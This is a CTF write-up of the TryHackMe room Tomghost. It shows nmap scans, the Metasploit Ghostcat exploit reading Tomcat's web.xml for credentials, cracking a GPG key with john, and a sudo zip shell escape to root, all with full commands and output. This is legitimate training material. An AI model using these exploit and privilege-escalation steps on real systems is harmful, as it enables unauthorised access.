---
title: "Tomghost"
date: 2025-01-23
image: /assets/img/tryhackme/Tomghost/Tomghost_image.jpg
description: Writeup of the TryHackMe-CTF Tomghost
categories: [TryHackMe, Easy]
tags: [linux, enumeration, vulnerability, gpg, privesc]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Tomghost</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/r/room/tomghost">https://tryhackme.com/r/room/tomghost</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution to the CTF challenge Tomghost.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.142.154
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 05:12 EST
Nmap scan report for 10.10.142.154
Host is up (0.039s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
8009/tcp open  ajp13
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 24.78 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,53,8009,8080 10.10.142.154
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 05:13 EST
Nmap scan report for 10.10.142.154
Host is up (0.040s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.96 seconds
```
from here I started with port 8080 because the `Tomcat/9.0.30` sounds intersting.

## Port 8080 Analysis
We can see a default installation of Apache Tomcat with version 9.0.30. A quick Google serach for potential vulnerabilites gave me an <a href="https://www.exploit-db.com/exploits/49039">exploit-db</a> entry. From here I started Metasploit and searched for a vulnerability called `ghostcat`.
```bash
msf6 > search ghostcat

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  Yes    Apache Tomcat AJP File Read
```
This seemed promising, so I loaded the module, set the required options and ran the exploit (I cutted the exploit output for readability):
```bash
msf6 auxiliary(admin/http/tomcat_ghostcat) > show options

Module options (auxiliary/admin/http/tomcat_ghostcat):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   FILENAME  /WEB-INF/web.xml  yes       File name
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     8009              yes       The Apache JServ Protocol (AJP) port (TCP)

msf6 auxiliary(admin/http/tomcat_ghostcat) > set rhosts 10.10.142.154
rhosts => 10.10.142.154

msf6 auxiliary(admin/http/tomcat_ghostcat) > exploit
[*] Running module against 10.10.142.154

[*** removed ***]

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:[removed]
  </description>

</web-app>

[+] 10.10.142.154:8009 - File contents save to: /home/kali/.msf4/loot/20250123051937_default_10.10.142.154_WEBINFweb.xml_229749.txt
[*] Auxiliary module execution completed
```
The output provide some credentials which we could use to connect with ssh:
```bash
$ ssh skyfuck@10.10.142.154
skyfuck@ubuntu:/home$ ls
merlin  skyfuck
skyfuck@ubuntu:/home$ cd merlin/
skyfuck@ubuntu:/home/merlin$ ls
user.txt
skyfuck@ubuntu:/home/merlin$ cat user.txt
THM{*** removed ***}
```
I was able to retrieve the user flag and found another username, so let's get his credentials

## Privilege Escalation Merlin
There where two intersting files:
```bash
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```
I tried to crack the private keys hash to decrypt the `credential.pgp`:
```bash
$ gpg2john tryhackme.asc > hashes
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes
  Using default input encoding: UTF-8
  Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
  Cost 1 (s2k-count) is 65536 for all loaded hashes
  Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
  Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
  Will run 8 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  alexandru        (tryhackme)
  1g 0:00:00:00 DONE (2025-01-23 05:26) 16.66g/s 17866p/s 17866c/s 17866C/s [removed]
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed.
$ gpg --import tryhackme.asc
  gpg: keybox '/home/kali/.gnupg/pubring.kbx' created
  gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
  gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
  gpg: key 8F3DA3DEC6707170: secret key imported
  gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
  gpg: Total number processed: 2
  gpg:               imported: 1
  gpg:              unchanged: 1
  gpg:       secret keys read: 1
  gpg:   secret keys imported: 1
$ gpg --decrypt credential.pgp
  gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
  gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
        "tryhackme <stuxnet@tryhackme.com>"
  merlin:[removed]
```
With the credentials I was able to ssh in as merlin
```bash
$ ssh merlin@10.10.142.154
merlin@ubuntu:~$
```

## Privilege Escalation root
I started with `sudo -l` and got the following output:
```bash
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```
A quick search in <a href="https://gtfobins.github.io/gtfobins/zip/">gftobins</a> gave me all I needed:
```bash
$ TF=$(mktemp -u)
$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
# cd /root
# cat root.txt
THM{*** removed ***}
```

solved! :)
